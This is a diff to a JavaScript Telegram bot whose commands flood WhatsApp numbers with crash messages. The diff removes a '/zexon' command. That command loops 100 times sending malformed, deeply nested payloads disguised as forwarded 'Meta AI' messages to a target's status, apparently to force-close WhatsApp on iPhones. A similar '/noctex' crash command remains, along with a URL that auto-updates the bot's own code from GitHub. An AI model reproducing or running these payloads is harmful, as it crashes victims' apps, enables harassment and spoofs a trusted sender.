@@ -626,8 +626,7 @@ bot.action("holee", async (ctx) => {
     .table(
       [
         ["Commands", "Effect"],
-        ["/noctex", "Force Close Invisibles"],
-        ["/zexon", "FORCE X CLOSE"]
+        ["/noctex", "Force Close Invisibles"]
       ],
       { bordered: true, striped: true, hasHeader: true }
     )
@@ -1933,75 +1932,7 @@ bot.command("noctex", checkPremiumOrGroupPremium, checkWhatsAppConnection, async
   }
 });
 
-bot.command("zexon", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
-  const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply("🪧 ⚠️ Example : /zexon 62xx");
-
-  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-
-  if (ctx.chat.type === 'private') {
-    const DRAFT_ID = 99;
-    await ctx.sendRichMessageDraft(
-      DRAFT_ID,
-      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
-    );
-  }
-
-  const richContent = new HTML()
-    .photo(PHOTOS[0], "Asmodeus — SEND BUG")
-    .heading(1, HTML.customEmoji("6032660275973330342", "💀") + " ASMODEUS — SEND BUG")
-    .paragraph(HTML.customEmoji("4956233646441760046", "✅") + " Exploit Successfully Sent...")
-    .divider()
-    .table(
-      [
-        ["Info", "Detail"],
-        [HTML.customEmoji("6298678524379137990", "🎯") + " Target", `+${q.replace(/[^0-9]/g, "")}`],
-        [HTML.customEmoji("4956233646441760046", "✅") + " Status", "Success"],
-        [HTML.customEmoji("5334756145099722681", "📱") + " Platform", "IPHONE"],
-        [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "FORCE X CLOSE"]
-      ],
-      { bordered: true, striped: true, hasHeader: true }
-    )
-    .divider()
-    .taskList(
-      { text: "Invisible Hard", checked: true },
-      { text: "Bug Gacor", checked: true },
-      { text: "Bebas Spam", checked: false },
-      { text: "Anti Kenon 80%", checked: true }
-    )
-    .divider()
-    .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
-    .build();
-
-  await ctx.sendRichMessage(richContent, {
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "6298678524379137990"}]
-      ]
-    }
-  });
-
-  try {
-    if (typeof sock === "undefined" || !sock) {
-      throw new Error("Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.");
-    }
-
-    for (let i = 0; i < 100; i++) {
-      await ForceInvisIos(sock, target);
-      const delay = 1500 + Math.floor(Math.random() * 501);
-      await sleep(delay);
-    }
-  } catch (error) {
-    return await ctx.sendRichMessage(
-      new HTML()
-        .heading(2, "⚠️ Gagal Mengirim")
-        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
-        .build()
-    );
-  }
-});
-
-const UPDATE_URL = "https://raw.githubusercontent.com/Unbandfoul/scary_autoupdate/refs/heads/main/scary.js";
+const UPDATE_URL = "https://raw.githubusercontent.com/Darlin77/scary_autoupdate/refs/heads/main/scary.js";
 const UPDATE_FILE_PATH = "./scary.js";
 
 function downloadToFile(url, filePath) {
@@ -2177,7 +2108,7 @@ async function FrezeeHomeV3(sock, target) {
         }, { noSelfSync: true })
      }
 
-/* IOS FC NEW - gunma (noctex) */
+/* IOS FC NEW */
 const buffer1 = {
   "interactiveMessage": {
     "interactiveMessage": {
@@ -2359,163 +2290,6 @@ async function gunma(demmy, target) {
   messageId: msg.key.id, 
  });
 }
-
-/* IOS FC NEW - ForceInvisIos (zexon) */
-const bufferZexon1 = {
-  "interactiveMessage": {
-    "interactiveMessage": {
-      "header": {
-        "title": "🪭𝚂𝙴𝙲𝚁𝙴𝚃 ♕ 𝙲𝙾𝙼𝙿𝙰𝙽𝚈🪭",
-        "subtitle": "666",
-        "hasMediaAttachment": false
-      },
-      "body": { "text": "Apa yang ingin anda lakukan?" },
-      "footer": { "text": "Nishiki" },
-      "nativeFlowMessage": {
-        "buttons": [
-          { "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Opsi 1\",\"id\":\"opt_1\"}" },
-          { "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Opsi 3\",\"id\":\"opt_3\"}" }
-        ],
-        "messageParamsJson": "{}"
-      },
-      "mtype": "interactiveMessage",
-      "id": "3EB002CBD0A177798DC757",
-      "chat": "135759822622788@lid",
-      "isBaileys": false,
-      "sender": "215178549395532@lid",
-      "fromMe": false,
-      "text": "",
-      "mentionedJid": [],
-      "fakeObj": {
-        "messageStubParameters": [],
-        "labels": [],
-        "userReceipt": [],
-        "reactions": [],
-        "pollUpdates": [],
-        "eventResponses": [],
-        "statusMentions": [],
-        "messageAddOns": [],
-        "statusMentionSources": [],
-        "supportAiCitations": [],
-        "key": "[SENSITIVE_DATA_OMITTED]",
-        "message": {
-          "interactiveMessage": {
-            "header": {
-              "title": "🪭𝚂𝙴𝙲𝚁𝙴𝚃 ♕ 𝙲𝙾𝙼𝙿𝙰𝙽𝚈🪭",
-              "subtitle": "666",
-              "hasMediaAttachment": false
-            },
-            "body": { "text": "Apa yang ingin anda lakukan?" },
-            "footer": { "text": "Nishiki" },
-            "nativeFlowMessage": {
-              "buttons": ["[TRUNCATED_DEPTH]", "[TRUNCATED_DEPTH]"],
-              "messageParamsJson": "{}"
-            },
-            "mtype": "interactiveMessage",
-            "id": "3EB002CBD0A177798DC757",
-            "chat": "135759822622788@lid",
-            "isBaileys": false,
-            "sender": "215178549395532@lid",
-            "fromMe": false,
-            "text": "",
-            "mentionedJid": [],
-            "fakeObj": {
-              "messageStubParameters": [],
-              "labels": [],
-              "userReceipt": [],
-              "reactions": [],
-              "pollUpdates": [],
-              "eventResponses": [],
-              "statusMentions": [],
-              "messageAddOns": [],
-              "statusMentionSources": [],
-              "supportAiCitations": [],
-              "key": "[SENSITIVE_DATA_OMITTED]",
-              "message": { "interactiveMessage": "[TRUNCATED_DEPTH]" }
-            },
-            "delete": "[FUNCTION]",
-            "copyNForward": "[FUNCTION]",
-            "download": "[FUNCTION]"
-          }
-        }
-      },
-      "delete": "[FUNCTION]",
-      "copyNForward": "[FUNCTION]",
-      "download": "[FUNCTION]"
-    }
-  }
-};
-
-let dataZexon;
-try {
-  dataZexon = JSON.stringify(bufferZexon1, null, 2);
-} catch (stringifyErr) {
-  console.error(stringifyErr.message);
-}
-
-const bufferZexon = Buffer.from(dataZexon, 'utf8');
-
-async function ForceInvisIos(sock, target) {
-    await sock.relayMessage('status@broadcast', {
-        botForwardedMessage: { 
-            message: {
-                richResponseMessage: { 
-                    messageType: "AI_RICH_RESPONSE_TYPE_STANDARD",
-                    submessages: [{ messageType: "AI_RICH_RESPONSE_TEXT", messageText: "MakLo" }],
-                    unifiedResponse: { 
-                        data: Buffer.from(JSON.stringify({ 
-                            response_id: "666",
-                            sections: [
-                                { 
-                                    view_model: { 
-                                        primitive: { 
-                                            text: "",
-                                            __typename: "GenAIMarkdownTextUXPrimitive" 
-                                        },
-                                        __typename: "GenAISingleLayoutViewModel" 
-                                    } 
-                                }, 
-                                { 
-                                    view_model: { 
-                                        primitive: { 
-                                            language: "Gunma",
-                                            code_blocks: [
-                                                { "content": "MakLo🪭\n\n\n", "type": "NUMBER" },
-                                                { "content": bufferZexon, "type": "STR" }
-                                            ],
-                                            __typename: "GenAICodeUXPrimitive" 
-                                        },
-                                        __typename: "GenAISingleLayoutViewModel" 
-                                    } 
-                                }, 
-                                { 
-                                    view_model: { 
-                                        primitive: { 
-                                            text: "",
-                                            __typename: "GenAIMarkdownTextUXPrimitive" 
-                                        },
-                                        __typename: "GenAISingleLayoutViewModel"
-                                    }
-                                }
-                            ]
-                        })).toString("base64")
-                    },
-                    contextInfo: { 
-                        forwardingScore: 1, 
-                        isForwarded: true,
-                        forwardedAiBotMessageInfo: { 
-                            botName: "Meta AI",
-                            botJid: "13135550002@s.whatsapp.net", 
-                            creatorName: "Meta"
-                        }
-                    }
-                }
-            }
-        }
-     }, {
-      statusJidList: [target]
-    })
- }
 
 /* End Bug */
 
